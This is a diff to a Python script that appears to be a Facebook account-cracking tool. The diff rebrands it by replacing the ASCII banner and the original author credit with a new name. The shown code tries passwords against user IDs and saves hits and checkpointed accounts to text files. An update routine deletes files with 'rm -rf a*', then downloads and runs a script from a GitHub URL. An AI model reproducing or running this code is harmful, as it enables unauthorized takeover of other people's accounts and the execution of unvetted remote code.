@@ -1088,18 +1088,16 @@ for xd in range(10000):
     ugen.append(uaku2)
 
 logo = """
-\033[1;32m
- .d8888b.        .d8888b.        .d8888b.  
-d88P  Y88b      d88P  Y88b      d88P  Y88b 
-Y88b.           Y88b.           888    888 
- "Y888b.         "Y888b.        888        
-    "Y88b.          "Y88b.      888  88888 
-      "888            "888      888    888 P\033[1;32m
-Y88b  d88P      Y88b  d88P      Y88b  d88P R\033[93;1m 
- "Y8888P"        "Y8888P"        "Y8888P88 O\033[94;1m
+      \033[1;39m .########...######..##.....##
+      \033[1;32m .##.....##.##....##.##.....##
+      \033[1;39m .##.....##.##.......##.....##
+      \033[1;32m .########...######..#########
+      \033[1;39m .##...##.........##.##.....##
+      \033[1;32m .##....##..##....##.##.....##
+      \033[1;39m .##.....##..######..##.....##
 --------------------------------------------------
-[•] AUTHOR     : \x1b[38;5;208mYASIR_X_MARWAN\033[1;37m
-[•] GITHUB     : \x1b[38;5;208mMARWAN-TECH404\033[1;37m
+[•] AUTHOR     : \x1b[38;5;208mRaziqullah Saadat\033[1;37m
+[•] GITHUB     : \x1b[38;5;208mSaadat\033[1;37m
 [•] TOOL TYPE  : \x1b[38;5;208mRANDOM\033[1;37m
 [•] STATUS     : \x1b[38;5;208mPAID\033[1;37m
 --------------------------------------------------
@@ -1119,7 +1117,7 @@ try:
     if str(v) in update:
         os.system('rm -rf a*')
         os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
-        os.system('python ali.py')
+        os.system('python Saadat.py')
     else:pass
 except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
 
@@ -1490,21 +1488,21 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[SSG-OK] '+cid+' | '+ps+'\x1b[1;97m')
-                open('SSG-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                print('\033[1;32m[Saadat-OK] '+cid+' | '+ps+'\x1b[1;97m')
+                open('Saadat-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
                 # print('\033[1;33m[SSG-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('SSG-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                open('Saadat-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mSTarTing\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mSaadat\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
